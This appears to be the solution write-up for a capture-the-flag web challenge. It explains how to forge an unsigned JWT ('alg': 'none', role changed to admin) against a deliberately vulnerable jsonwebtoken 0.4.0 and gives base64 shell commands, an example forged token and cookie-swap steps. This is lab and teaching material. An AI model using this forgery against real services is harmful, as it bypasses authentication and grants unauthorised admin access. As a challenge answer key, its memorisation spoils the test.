# Solution

*Version of jsonwebtoken package needs to be exactly (vulnerable)*
> "jsonwebtoken": "0.4.0",


1. Access page and try to login with whatever
2. Login fail but a hint to try with test/test is displayed
3. Try to login with `test/test` => success, but not that much else
4. Checking the application tab in dev tools reveals that a cookie is created containing a JWT token
5. Use https://jwt.io to decode token and see what's inside or use 
Craft a token using same info from token but changing alg to "none" and role to "admin" (or whatever different than "user")

## Method 1
Replace value of "auth" property with the one of original token in `./SOLUTION/solution.js` then
```
node ./SOLUTION/solution.js
```

## Method 2
Generate token manually

### header
```
echo -n '{"typ":"JWT","alg":"none" }' | base64
```
### payload
```
echo -n '{"auth": <VALUE_FROM_ORIG_TOKEN>,"role": "admin","iat": <VALUE_FROM_ORIG_TOKEN>}' | base64
```
### sign
No sign

### altogether
header.payload.sign gives for example:

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIiB9.eyJhdXRoIjogMTYzMTE0Nzc3MzAzMSwiYWdlbnQiOiAiTW96aWxsYS81LjAgKE1hY2ludG9zaDsgSW50ZWwgTWFjIE9TIFggMTBfMTVfNykgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzkyLjA.
```

6. Replace token value in browser cookie with crafted one
7. Refresh page `/private`
8. Flag should be displayed on page